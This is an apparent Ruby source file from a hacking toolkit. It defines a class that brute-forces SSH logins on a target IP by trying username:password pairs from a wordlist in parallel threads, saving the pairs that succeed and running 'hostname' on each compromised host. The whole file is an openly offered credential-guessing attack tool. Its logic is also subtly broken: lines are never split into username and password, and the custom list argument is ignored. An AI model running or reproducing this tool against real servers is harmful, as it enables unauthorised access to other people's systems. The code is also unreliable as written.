# frozen_string_literal: true

require 'net/ssh'
module Snackhack2
  class SSHBute
    def initialize(ip, list: nil)
      @ip = ip
      @list = list
      @success_list = []
    end

    def list
      # the list of usernames and password.
      # username:password
      File.join(__dir__, 'lists', 'sshbrute.txt')
    end

    def run
      threads = []
      # uses threads to make it faster
      File.readlines(list).each { |usr, pass| threads << Thread.new { brute(usr, pass) } }
      threads.each(&:join)

      p @success_list
    end

    def brute(username, pass)
      # does the bruting.
      # saves the valid creds to the @success_list instance variable array
      Net::SSH.start(@ip, username, password: pass, timeout: 1) do |ssh|
        @success_list << [username, pass]
        # runs the `hostame command if valid
        ssh.exec!('hostname')
      end
    rescue Net::SSH::AuthenticationFailed
    end
  end
end
